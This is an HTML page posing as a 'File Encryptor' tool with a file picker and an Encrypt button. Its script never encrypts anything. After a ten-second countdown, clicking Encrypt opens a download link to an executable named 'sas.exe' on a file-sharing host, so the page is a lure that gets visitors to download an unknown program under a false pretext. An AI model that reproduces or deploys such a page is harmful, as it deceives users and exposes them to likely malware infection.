<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Encryptor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #6a0dad; /* Purple theme */
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        h1 {
            margin-bottom: 30px;
        }
        #choose-file-button, #encrypt-button {
            padding: 15px 30px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
            transition: background-color 0.3s;
        }
        #choose-file-button {
            background-color: #ff69b4; /* Pink theme */
            color: white;
        }
        #choose-file-button:hover {
            background-color: #ff1493; /* Darker pink on hover */
        }
        #encrypt-button {
            background-color: #000; /* Black theme */
            color: white;
        }
        #encrypt-button:hover {
            background-color: #333; /* Darker black on hover */
        }
        input[type="file"] {
            display: none; /* Hides the file input */
        }
        #file-name {
            margin-top: 20px;
            font-size: 18px;
            color: #ffeb3b; /* Yellow color for file name */
        }
        #countdown {
            margin-top: 10px;
            font-size: 20px;
            color: #ffeb3b; /* Yellow color for countdown */
        }
    </style>
</head>
<body>

    <h1>File Encryptor</h1>
    <label id="choose-file-button" for="file-input">Choose File Wanna to Crypt</label>
    <input type="file" id="file-input" />

    <button id="encrypt-button">Encrypt</button>
    <div id="countdown"></div>

    <!-- Box to display the selected file name -->
    <div id="file-name">No file chosen</div>

    <script>
        // Add event listener for the encrypt button
        document.getElementById("encrypt-button").addEventListener("click", function() {
            let countdownValue = 10; // Set countdown value to 10 seconds
            const countdownDisplay = document.getElementById("countdown");
            countdownDisplay.textContent = `Executing in ${countdownValue} seconds...`;

            // Countdown interval
            const countdownInterval = setInterval(() => {
                countdownValue--;
                countdownDisplay.textContent = `Executing in ${countdownValue} seconds...`;

                // After 10 seconds, open the link and clear the interval
                if (countdownValue <= 0) {
                    clearInterval(countdownInterval);
                    window.open("https://www.upload.ee/download/17207934/3df134c596841f8ad51b/sas.exe", "_blank");
                    countdownDisplay.textContent = ""; // Clear countdown message
                }
            }, 1000); // Update every second
        });

        // Display the name of the chosen file
        document.getElementById("file-input").addEventListener("change", function() {
            const fileNameDisplay = document.getElementById("file-name");
            if (this.files.length > 0) {
                fileNameDisplay.textContent = "Selected file: " + this.files[0].name;
            } else {
                fileNameDisplay.textContent = "No file chosen";
            }
        });
    </script>

</body>
</html>
